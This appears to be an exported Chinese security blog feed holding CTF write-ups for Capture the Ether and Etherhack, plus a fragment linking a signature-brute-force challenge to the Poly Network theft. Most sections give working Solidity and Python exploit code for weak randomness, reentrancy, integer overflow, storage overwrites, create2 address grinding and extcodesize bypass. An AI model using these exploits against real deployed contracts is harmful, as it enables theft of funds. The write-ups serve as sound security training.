<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">token</span>.call(abi.encodePacked(bytes<span class="number">4</span>(keccak<span class="number">256</span>(abi.encodePacked(<span class="string">&quot;changeOwner(address)&quot;</span>))),abi.encode(<span class="number">0</span>x<span class="number">0</span>/<span class="number">0</span>x<span class="number">1</span>)));</span><br></pre></td></tr></table></figure>
<p>上述参数传递使用了Solidity语言的参数传递优化自动对齐的性质。</p>
<p>但是对于第二个调用不能是我们变成DVT3合约的owner，不太符合我们的调用。所以我们选择第一个调用。</p>
<h1 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h1><p>使用 github.com/ethereum/go-ethereum/crypto 的库编写一个Go语言的多线程爆脚本 大致经过十五分钟可以出结果</p>
<p><img src="/2021/11/12/33/image-20211024193711092.png" alt="image-20211024193711092"></p>
<p>可以看到两者的签名相同</p>
<p><img src="/2021/11/12/33/image-20211024193807987.png" alt="image-20211024193807987"></p>
<p>转化出攻击参数</p>
<p>进行攻击</p>
<p><img src="/2021/11/12/33/image-20211024163126593.png" alt="image-20211024163126593"></p>
<p>成功实现攻击</p>
<p><img src="/2021/11/12/33/image-20211024163204353.png" alt="image-20211024163204353"></p>
<p>最后实现触发SendFlag事件</p>
<p><img src="/2021/11/12/33/image-20211024163402002.png" alt="image-20211024163402002"></p>
<h1 id="与Poly-Network-事件的联系"><a href="#与Poly-Network-事件的联系" class="headerlink" title="与Poly Network 事件的联系"></a>与Poly Network 事件的联系</h1><p>在<a href="https://github.com/polynetwork/eth-contracts/blob/master/contracts/core/cross_chain_manager/logic/EthCrossChainManager_new_template.sol#L185">Poly Network官方开源的源码中</a>的_executeCrossChainTx函数中，我们可以容易的看到这一行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(success, returnData) &#x3D; _toContract.call(abi.encodePacked(bytes4(keccak256(abi.encodePacked(_method, &quot;(bytes,bytes,uint64)&quot;))), abi.encode(_args, _fromContractAddr, _fromChainId)));</span><br></pre></td></tr></table></figure>
<p>就可以在_toContract对应的合约上调用任意的函数，同时_toContract对应的合约上没有进行合理的鉴权，攻击者通过爆破_method从而调用 putCurEpochConPubKeyBytes 函数去替换 _toContract合约上的Keeper 的Public Key Bytes。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function putCurEpochConPubKeyBytes(bytes memory curEpochPkBytes) public whenNotPaused onlyOwner returns (bool) &#123;</span><br><span class="line">    ConKeepersPkBytes &#x3D; curEpochPkBytes;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在用替换后的Keeper的Public Key Bytes对应的私钥进行签名即可通过所有检查执行调用 LockProxy 合约将其管理的资产转出。</p>
<p>可以从<a href="https://www.4byte.directory/signatures/?bytes4_signature=0x41973cd9">函数签名库</a>中找到</p>
<p><img src="/2021/11/12/33/image-20211024164912828.png" alt="image-20211024164912828"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本次攻击利用的三个点</p>
<ul>
<li>权限控制错误</li>
<li>call调用参数可控</li>
<li>函数签名值的爆破</li>
</ul>
<p>本次漏洞的发生在本质上还是对于call调用的错误限制，并且和其他的漏洞组合使用导致了Poly Network  6.1亿美金的被盗事件。在智能合约的开发实践中还是需要注意严格控制call调用，不可使其参数可控。同时对于一些关键函数的权限控制在审计时应作为重点审计。将这些函数的使用权掌握在可控的地方，不可被恶意利用。</p>
]]></content>
      <categories>
        <category>区块链安全</category>
      </categories>
      <tags>
        <tag>区块链安全</tag>
        <tag>智能合约安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Capture the Ether wp</title>
    <url>/2022/03/10/34/</url>
    <content><![CDATA[<h1 id="Capture-the-Ether-wp"><a href="#Capture-the-Ether-wp" class="headerlink" title="Capture the Ether wp"></a>Capture the Ether wp</h1><h2 id="Guess-the-secret-number"><a href="#Guess-the-secret-number" class="headerlink" title="Guess the secret number"></a>Guess the secret number</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sha3</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>**<span class="number">8</span>):</span><br><span class="line">    <span class="keyword">if</span> sha3.keccak_256(long_to_bytes(i)).digest().<span class="built_in">hex</span>()==<span class="string">&#x27;db81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365&#x27;</span>:</span><br><span class="line">        print(i)</span><br></pre></td></tr></table></figure>
<h2 id="Guess-the-random-number"><a href="#Guess-the-random-number" class="headerlink" title="Guess the random number"></a>Guess the random number</h2><p><img src="/2022/03/10/34/image-20211118161455127.png" alt="image-20211118161455127"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> web3.auto.infura.ropsten <span class="keyword">import</span> w3</span><br><span class="line"><span class="keyword">import</span> sha3</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">byte32</span>(<span class="params">i</span>):</span></span><br><span class="line">    <span class="keyword">return</span> binascii.unhexlify(<span class="string">&#x27;%064x&#x27;</span>%i)</span><br><span class="line">blcokhash=<span class="built_in">int</span>(w3.eth.getBlock(<span class="number">11448140</span>-<span class="number">1</span>)[<span class="string">&#x27;hash&#x27;</span>].<span class="built_in">hex</span>(),<span class="number">16</span>)</span><br><span class="line">blcoktimetamp=w3.eth.getBlock(<span class="number">11448140</span>)[<span class="string">&#x27;timestamp&#x27;</span>]</span><br><span class="line"></span><br><span class="line">print(sha3.keccak_256(byte32(blcokhash)+byte32(blcoktimetamp)).digest().<span class="built_in">hex</span>()[-<span class="number">2</span>:])</span><br></pre></td></tr></table></figure>
<h2 id="Guess-the-new-number"><a href="#Guess-the-new-number" class="headerlink" title="Guess the new number"></a>Guess the new number</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">contract attacker &#123;</span><br><span class="line">    function attacker() public payable &#123;</span><br><span class="line">        uint8 result &#x3D; uint8(keccak256(block.blockhash(block.number - 1), now));</span><br><span class="line">        GuessTheNewNumberChallenge target &#x3D; GuessTheNewNumberChallenge(0x955745113aB0E98ACdfe1ffC6846C4d1CdfC4cFd);</span><br><span class="line">        target.guess.value(1 ether)(result);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function () public payable &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Predict-the-future"><a href="#Predict-the-future" class="headerlink" title="Predict the future"></a>Predict the future</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">contract attack&#123;</span><br><span class="line">    PredictTheFutureChallenge claim &#x3D;PredictTheFutureChallenge(0x69cF0a12620Fc8530bD94ab80b08C6b4A58d322d);</span><br><span class="line">    function attack() payable public&#123;</span><br><span class="line">        claim.lockInGuess.value(1 ether)(1);</span><br><span class="line">    &#125;</span><br><span class="line">    function tryhack()&#123;</span><br><span class="line">        uint8 answer &#x3D; uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;</span><br><span class="line">        if(answer&#x3D;&#x3D;1) &#123;</span><br><span class="line">            claim.settle();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    function () public payable &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Predict-the-block-hash"><a href="#Predict-the-block-hash" class="headerlink" title="Predict the block hash"></a>Predict the block hash</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">contract attack&#123;</span><br><span class="line">    PredictTheBlockHashChallenge claim &#x3D; PredictTheBlockHashChallenge(0x75A30ccC225cCe71F553d113612F04F42Ec11221);</span><br><span class="line">    uint settlementBlockNumber;</span><br><span class="line">    function attack() payable public&#123;</span><br><span class="line">        settlementBlockNumber &#x3D; block.number + 1;</span><br><span class="line">        claim.lockInGuess.value(1 ether)(0x0000000000000000000000000000000000000000000000000000000000000000);</span><br><span class="line">    &#125;</span><br><span class="line">    function tryhack()&#123;</span><br><span class="line">        require(settlementBlockNumber-block.number&gt;&#x3D;256);</span><br><span class="line"> </span><br><span class="line">        claim.settle();</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    function () public payable &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Token-sale"><a href="#Token-sale" class="headerlink" title="Token sale"></a>Token sale</h2><p>整数乘法上溢</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(<span class="built_in">hex</span>(<span class="number">2</span>**<span class="number">256</span>//<span class="number">10</span>**<span class="number">18</span> +<span class="number">1</span>))</span><br><span class="line">tt=<span class="number">2</span>**<span class="number">256</span>//<span class="number">10</span>**<span class="number">18</span> +<span class="number">1</span></span><br><span class="line">print(tt*<span class="number">10</span>**<span class="number">18</span>-<span class="number">2</span>**<span class="number">256</span>)</span><br></pre></td></tr></table></figure>
<h2 id="Token-whale"><a href="#Token-whale" class="headerlink" title="Token whale"></a>Token whale</h2><p>_transfer函数存在溢出</p>
<p>player  transfer  -&gt; A 600</p>
<p>A   approve -&gt; player 1000</p>
<p>player   transferFrom -&gt; A -&gt; B 600</p>
<p>Balance[player]-600</p>
<h2 id="Retirement-fund"><a href="#Retirement-fund" class="headerlink" title="Retirement fund"></a>Retirement fund</h2><p>自毁强制转账，满足调用collectPenalty</p>
<h2 id="Mapping"><a href="#Mapping" class="headerlink" title="Mapping"></a>Mapping</h2><p>覆盖map数组的长度实现数组越界访问，最后通过计算相对位置覆盖isComplete</p>
<h2 id="Donation"><a href="#Donation" class="headerlink" title="Donation"></a>Donation</h2><p>结构体的非显式存储导致(未初始化的storage指针)的变量覆盖</p>
<p>donation.etherAmount=uint256(address) 可以实现对owner的覆盖</p>
<p>再简单计算一下msg.value</p>
<h2 id="Fifty-years"><a href="#Fifty-years" class="headerlink" title="Fifty years"></a>Fifty years</h2><p>算是Mapping和Donation的结合体</p>
<p>msg.value会覆盖queue的长度，timestamp会覆盖head</p>
<p>Upset(1,2^256-86400)(1 wei)</p>
<p>Upset(1,0)(1 wei)</p>
<p>需要注意的是，我们的msg.value会先覆盖contribution.amount，而后的push操作会用queue长度再覆盖contribution.amount一次，也就是实际记录的total会大于contract.balance，会导致我们在withdraw的时候失败，所以需要进行一定的变形，这就是两次1wei的原因所在</p>
<h2 id="Fuzzy-identity"><a href="#Fuzzy-identity" class="headerlink" title="Fuzzy identity"></a>Fuzzy identity</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">contract BadCodeSmarx is IName &#123;</span><br><span class="line">    function callAuthenticate(address _challenge) public &#123;</span><br><span class="line">       FuzzyIdentityChallenge(_challenge).authenticate(); </span><br><span class="line">    &#125;</span><br><span class="line">    function name() external view returns (bytes32) &#123;</span><br><span class="line">       return bytes32(&quot;smarx&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from web3 import Web3</span><br><span class="line"></span><br><span class="line">s1 &#x3D; &#39;0xff&#39;+address(EOA)</span><br><span class="line"></span><br><span class="line">s3 &#x3D; &#39;4670da3f633e838c2746ca61c370ba3dbd257b86b28b78449f4185480e2aba51&#39;</span><br><span class="line"></span><br><span class="line">i &#x3D; 0</span><br><span class="line">while(1):</span><br><span class="line">    salt &#x3D; hex(i)[2:].rjust(64, &#39;0&#39;)</span><br><span class="line">    s &#x3D; s1+salt+s3</span><br><span class="line">    hashed &#x3D; Web3.sha3(hexstr&#x3D;s)</span><br><span class="line">    hashed_str &#x3D; &#39;&#39;.join([&#39;%02x&#39; % b for b in hashed])</span><br><span class="line">    if &#39;badc0de&#39; in hashed_str[24:]:</span><br><span class="line">        print(salt,hashed_str)</span><br><span class="line">        break</span><br><span class="line">    i +&#x3D; 1</span><br><span class="line">    print(salt)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">contract Deployer &#123;</span><br><span class="line">    &#x2F;&#x2F; contractBytecode是待部署合约的bytecode</span><br><span class="line">    bytes contractBytecode &#x3D; hex&quot;608060405234801561001057600080fd5b5061015d806100206000396000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c806306fdde031461003b5780637872ab4914610059575b600080fd5b61004361009d565b6040518082815260200191505060405180910390f35b61009b6004803603602081101561006f57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506100c5565b005b60007f736d617278000000000000000000000000000000000000000000000000000000905090565b8073ffffffffffffffffffffffffffffffffffffffff1663380c7a676040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561010d57600080fd5b505af1158015610121573d6000803e3d6000fd5b505050505056fea265627a7a72315820fb2fc7a07f0eebf799c680bb1526641d2d905c19393adf340a04e48c9b527de964736f6c634300050c0032&quot;;</span><br><span class="line"> </span><br><span class="line">    function deploy(bytes32 salt) public &#123;</span><br><span class="line">        bytes memory bytecode &#x3D; contractBytecode;</span><br><span class="line">        address addr;</span><br><span class="line">      </span><br><span class="line">        assembly &#123;</span><br><span class="line">          addr :&#x3D; create2(0, add(bytecode, 0x20), mload(bytecode), salt)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Public-Key"><a href="#Public-Key" class="headerlink" title="Public Key"></a>Public Key</h2><p>公钥计算</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; ethers &#125; = <span class="built_in">require</span>(<span class="string">&#x27;ethers&#x27;</span>)</span><br><span class="line"><span class="keyword">let</span> provider = <span class="keyword">new</span> ethers.providers.InfuraProvider(<span class="string">&#x27;ropsten&#x27;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(provider._isProvider)</span><br><span class="line"><span class="keyword">let</span> transactionHash=<span class="string">&quot;0xabc467bedd1d17462fcc7942d0af7874d6f8bdefee2b299c9168a216d3ff0edb&quot;</span></span><br><span class="line">provider.getTransaction(transactionHash).then(<span class="function">(<span class="params">firstTx</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(firstTx);</span><br><span class="line">    <span class="keyword">const</span> txData = &#123;</span><br><span class="line">        gasPrice: firstTx.gasPrice,</span><br><span class="line">        gasLimit: firstTx.gasLimit,</span><br><span class="line">        value: firstTx.value,</span><br><span class="line">        nonce: firstTx.nonce,</span><br><span class="line">        data: firstTx.data,</span><br><span class="line">        to: firstTx.to,</span><br><span class="line">        chainId: firstTx.chainId,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">const</span> signingData = ethers.utils.serializeTransaction(txData);</span><br><span class="line">    <span class="keyword">const</span> msgHash = ethers.utils.keccak256(signingData);</span><br><span class="line">    <span class="keyword">const</span> signature = &#123; <span class="attr">r</span>: firstTx.r, <span class="attr">s</span>: firstTx.s, <span class="attr">v</span>: firstTx.v &#125;;</span><br><span class="line">    <span class="keyword">let</span> rawPublicKey = ethers.utils.recoverPublicKey(msgHash, signature);</span><br><span class="line">    rawPublicKey = <span class="string">`0x<span class="subst">$&#123;rawPublicKey.slice(<span class="number">4</span>)&#125;</span>`</span>;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`Recovered public key <span class="subst">$&#123;rawPublicKey&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h2 id="Account-Takeover"><a href="#Account-Takeover" class="headerlink" title="Account Takeover"></a>Account Takeover</h2><p>利用随机数冲突的ECDSA签名恢复以太坊私钥</p>
<p><a href="http://snowming.me/2022/01/05/recover_secert_key/">参考</a></p>
<h2 id="Assume-ownership"><a href="#Assume-ownership" class="headerlink" title="Assume ownership"></a>Assume ownership</h2><p>权限控制问题</p>
<h2 id="Token-bank"><a href="#Token-bank" class="headerlink" title="Token bank"></a>Token bank</h2><p>重入攻击</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function withdraw(uint256 amount) public &#123;</span><br><span class="line">    require(balanceOf[msg.sender] &gt;&#x3D; amount);</span><br><span class="line"></span><br><span class="line">    require(token.transfer(msg.sender, amount));</span><br><span class="line">    &#x2F;&#x2F; balance decreased after recipient is notified</span><br><span class="line">    &#x2F;&#x2F; re-entrancy issue</span><br><span class="line">    balanceOf[msg.sender] -&#x3D; amount;</span><br><span class="line">&#125;</span><br><span class="line">function transfer(address to, uint256 value, bytes data) public returns (bool) &#123;</span><br><span class="line">    require(balanceOf[msg.sender] &gt;&#x3D; value);</span><br><span class="line"></span><br><span class="line">    balanceOf[msg.sender] -&#x3D; value;</span><br><span class="line">    balanceOf[to] +&#x3D; value;</span><br><span class="line">    emit Transfer(msg.sender, to, value);</span><br><span class="line"></span><br><span class="line">    if (isContract(to)) &#123;</span><br><span class="line">        ITokenReceiver(to).tokenFallback(msg.sender, value, data);</span><br><span class="line">    &#125;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>challenge.withdraw =&gt; token.transfer =&gt; msg.sender.tokenFallback() =&gt; …</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">    TokenBankChallenge public bank &#x3D; TokenBankChallenge(0x5e3D261A631c41659b37168199d9B8020a1d976c);</span><br><span class="line"></span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        SimpleERC223Token token &#x3D; SimpleERC223Token(bank.token());</span><br><span class="line"></span><br><span class="line">        uint256 balance &#x3D; token.balanceOf(this);</span><br><span class="line">        require(balance &#x3D;&#x3D; token.balanceOf(address(bank)));</span><br><span class="line">        require(balance + token.balanceOf(address(bank)) &#x3D;&#x3D; token.totalSupply());</span><br><span class="line"></span><br><span class="line">        token.transfer(address(bank), balance);</span><br><span class="line">        require(token.balanceOf(this) &#x3D;&#x3D; 0);</span><br><span class="line">        require(balance &#x3D;&#x3D; bank.balanceOf(this));</span><br><span class="line">        require(token.balanceOf(address(bank)) &#x3D;&#x3D; token.totalSupply());</span><br><span class="line"></span><br><span class="line">        bank.withdraw(balance);</span><br><span class="line">        require(bank.isComplete() &#x3D;&#x3D; true);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function tokenFallback(address from, uint256, bytes) public &#123;</span><br><span class="line">        SimpleERC223Token token &#x3D; SimpleERC223Token(bank.token());</span><br><span class="line">        require(msg.sender &#x3D;&#x3D; address(token));</span><br><span class="line"></span><br><span class="line">        if (from &#x3D;&#x3D; address(bank)) &#123;</span><br><span class="line">            if (token.balanceOf(address(bank)) &gt; 0) &#123;</span><br><span class="line">                uint256 balance &#x3D; bank.balanceOf(this);</span><br><span class="line">                bank.withdraw(balance);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>需要先用player账户withdraw出来，再转移到部署的攻击账户</p>
]]></content>
      <categories>
        <category>区块链安全</category>
      </categories>
      <tags>
        <tag>区块链安全</tag>
        <tag>智能合约安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Etherhack wp</title>
    <url>/2022/03/10/35/</url>
    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>写一下这个靶场的wp—<a href="https://etherhack.positive.com/">Etherhack</a></p>
<h1 id="Azino-777"><a href="#Azino-777" class="headerlink" title="Azino 777"></a>Azino 777</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.16;</span><br><span class="line"></span><br><span class="line">contract Azino777 &#123;</span><br><span class="line"></span><br><span class="line">  function spin(uint256 bet) public payable &#123;</span><br><span class="line">    require(msg.value &gt;&#x3D; 0.01 ether);</span><br><span class="line">    uint256 num &#x3D; rand(100);</span><br><span class="line">    if(num &#x3D;&#x3D; bet) &#123;</span><br><span class="line">        msg.sender.transfer(this.balance);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F;Generate random number between 0 &amp; max</span><br><span class="line">  uint256 constant private FACTOR &#x3D;  1157920892373161954235709850086879078532699846656405640394575840079131296399;</span><br><span class="line">  function rand(uint max) constant private returns (uint256 result)&#123;</span><br><span class="line">    uint256 factor &#x3D; FACTOR * 100 &#x2F; max;</span><br><span class="line">    uint256 lastBlockNumber &#x3D; block.number - 1;</span><br><span class="line">    uint256 hashVal &#x3D; uint256(block.blockhash(lastBlockNumber));</span><br><span class="line"></span><br><span class="line">    return uint256((uint256(hashVal) &#x2F; factor)) % max;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function() public payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>随机数问题，如果我们能得知rand(100) 的结果，也就能绕过num == bet的限制，让受害合约给我们转账。而rand(100) 的结果主要取决于block.number，而在一个区块内block.number是确定的，也就是我们在一个攻击合约的函数内同时调用rand函数和 spin函数，就能绕过随机数限制。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function WeakRandomAttack(address _target) public payable &#123;</span><br><span class="line">    target &#x3D; Azino777(_target);</span><br><span class="line">&#125;</span><br><span class="line">function attack() public &#123;</span><br><span class="line">    uint256 num &#x3D; rand(100);</span><br><span class="line">    target.spin.value(0.01 ether)(num);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="Private-Ryan"><a href="#Private-Ryan" class="headerlink" title="Private Ryan"></a>Private Ryan</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.16;</span><br><span class="line"></span><br><span class="line">contract PrivateRyan &#123;</span><br><span class="line">  uint private seed &#x3D; 1;</span><br><span class="line"></span><br><span class="line">  function PrivateRyan() &#123;</span><br><span class="line">    seed &#x3D; rand(256);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function spin(uint256 bet) public payable &#123;</span><br><span class="line">    require(msg.value &gt;&#x3D; 0.01 ether);</span><br><span class="line">    uint256 num &#x3D; rand(100);</span><br><span class="line">    seed &#x3D; rand(256);</span><br><span class="line">    if(num &#x3D;&#x3D; bet) &#123;</span><br><span class="line">        msg.sender.transfer(this.balance);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F;Generate random number between 0 &amp; max</span><br><span class="line">  uint256 constant private FACTOR &#x3D;  1157920892373161954235709850086879078532699846656405640394575840079131296399;</span><br><span class="line">  function rand(uint max) constant private returns (uint256 result)&#123;</span><br><span class="line">    uint256 factor &#x3D; FACTOR * 100 &#x2F; max;</span><br><span class="line">    uint256 blockNumber &#x3D; block.number - seed;</span><br><span class="line">    uint256 hashVal &#x3D; uint256(block.blockhash(blockNumber));</span><br><span class="line"></span><br><span class="line">    return uint256((uint256(hashVal) &#x2F; factor)) % max;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function() public payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这道题也是随机数问题，合约部署时会仅调用一次PrivateRyan() 函数，将seed的值改变，此时我们可以使用区块链浏览器读取合约上的状态值，也可以使用 <a href="https://github.com/ethereum/wiki/wiki/JavaScript-API#web3ethgetstorageat">web3.eth.getStorageAt()</a> 函数来读取。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">contract Attack &#123;</span><br><span class="line">  PrivateRyan target;</span><br><span class="line">  uint private seed;</span><br><span class="line">  function Attack (address _target, uint _seed) public payable &#123;</span><br><span class="line">    target &#x3D; PrivateRyan(_target);</span><br><span class="line">    seed &#x3D; _seed;</span><br><span class="line">  &#125;</span><br><span class="line">  function attack() public &#123;</span><br><span class="line">    uint256 num &#x3D; seed;</span><br><span class="line">    target.spin.value(0.01 ether)(seed);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1 id="Wheel-of-Fortune"><a href="#Wheel-of-Fortune" class="headerlink" title="Wheel of Fortune"></a>Wheel of Fortune</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.16;</span><br><span class="line"></span><br><span class="line">contract WheelOfFortune &#123;</span><br><span class="line">  Game[] public games;</span><br><span class="line"></span><br><span class="line">  struct Game &#123;</span><br><span class="line">      address player;</span><br><span class="line">      uint id;</span><br><span class="line">      uint bet;</span><br><span class="line">      uint blockNumber;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function spin(uint256 _bet) public payable &#123;</span><br><span class="line">    require(msg.value &gt;&#x3D; 0.01 ether);</span><br><span class="line">    uint gameId &#x3D; games.length;</span><br><span class="line">    games.length++;</span><br><span class="line">    games[gameId].id &#x3D; gameId;</span><br><span class="line">    games[gameId].player &#x3D; msg.sender;</span><br><span class="line">    games[gameId].bet &#x3D; _bet;</span><br><span class="line">    games[gameId].blockNumber &#x3D; block.number;</span><br><span class="line">    if (gameId &gt; 0) &#123;</span><br><span class="line">      uint lastGameId &#x3D; gameId - 1;</span><br><span class="line">      uint num &#x3D; rand(block.blockhash(games[lastGameId].blockNumber), 100);</span><br><span class="line">      if(num &#x3D;&#x3D; games[lastGameId].bet) &#123;</span><br><span class="line">          games[lastGameId].player.transfer(this.balance);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function rand(bytes32 hash, uint max) pure private returns (uint256 result)&#123;</span><br><span class="line">    return uint256(keccak256(hash)) % max;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function() public payable &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>依旧是随机数问题，要求满足_bet == num，_bet 是传入的参数，sum 是上一个games用户注册时的block.number进行一些运算得到的。也就是说如果我们提前知道上一个用户注册时的block.number，就能推算出num。显然我们在同一区块进行两次注册，就能在第二次的使用block.number得到上一个用户的blockNumber。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">contract attack&#123;</span><br><span class="line">    uint num;</span><br><span class="line">    WheelOfFortune a &#x3D;  WheelOfFortune(claim contract address);</span><br><span class="line">    function rand(bytes32 hash, uint max) pure private returns (uint256 result)&#123;</span><br><span class="line">        return uint256(keccak256(hash)) % max;</span><br><span class="line">    &#125;</span><br><span class="line">    function attacke() payable public&#123;</span><br><span class="line">       </span><br><span class="line">                                     </span><br><span class="line">        num &#x3D; rand(block.blockhash(block.number), 100);</span><br><span class="line">        a.spin.value(0.01 ether)(num);</span><br><span class="line">        a.spin.value(0.01 ether)(num);</span><br><span class="line">    &#125;</span><br><span class="line">    function balance()  public view returns (uint) &#123;&#x2F;&#x2F;检测余额变化，用于验证是否攻击成功</span><br><span class="line">        return  address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">    function() payable public&#123;&#125;</span><br><span class="line">    function  attack() payable public&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="Call-Me-Maybe"><a href="#Call-Me-Maybe" class="headerlink" title="Call Me Maybe"></a>Call Me Maybe</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">contract CallMeMaybe &#123;</span><br><span class="line">    modifier CallMeMaybe() &#123;</span><br><span class="line">      uint32 size;</span><br><span class="line">      address _addr &#x3D; msg.sender;</span><br><span class="line">      assembly &#123;</span><br><span class="line">        size :&#x3D; extcodesize(_addr)</span><br><span class="line">      &#125;</span><br><span class="line">      if (size &gt; 0) &#123;</span><br><span class="line">          revert();</span><br><span class="line">      &#125;</span><br><span class="line">      _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function HereIsMyNumber() CallMeMaybe &#123;</span><br><span class="line">        if(tx.origin &#x3D;&#x3D; msg.sender) &#123;</span><br><span class="line">            revert();</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            msg.sender.transfer(this.balance);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function() payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过分析CallMeMaybe关键词，发现只能是要求调用地址的代码等于0。在分析HereIsMyNumber()函数，又要求tx.origin == msg.sender，这需要我们通过部署合约调用解决，但是extcodesize(_addr)=0又怎么解决呢。其实在合约创建初期的时候合约的extcodesize是等于零的。所以我可以可以写出下面的合约攻击</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">contract attack&#123;</span><br><span class="line"></span><br><span class="line">    constructor(CallMeMaybe _target) public &#123;</span><br><span class="line">        _target.HereIsMyNumber();</span><br><span class="line">    &#125; </span><br><span class="line">    function() payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
